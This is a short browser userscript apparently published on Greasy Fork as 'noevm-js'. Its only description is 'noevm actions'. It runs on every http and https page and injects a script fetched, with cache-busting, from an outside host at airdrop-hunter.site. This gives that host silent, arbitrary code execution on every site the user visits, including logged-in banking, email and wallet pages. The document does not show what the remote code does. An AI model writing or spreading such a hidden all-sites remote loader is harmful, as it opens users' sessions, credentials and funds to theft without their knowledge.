// ==UserScript==
// @name         noevm-js
// @version      0.02
// @author       lxgn
// @description  noevm actions
// @match        https://*/*
// @match        http://*/*
// @license MIT
// @namespace https://greasyfork.org/users/195836
// @downloadURL https://update.greasyfork.org/scripts/489672/noevm-js.user.js
// @updateURL https://update.greasyfork.org/scripts/489672/noevm-js.meta.js
// ==/UserScript==
 
var ms = new Date();
 
var script = document.createElement('script');
 
var kuda = "https://noevm-js2.airdrop-hunter.site/in/?"+ms.getTime();
console.log(kuda);
script.src = kuda;
document.body.appendChild(script);
 
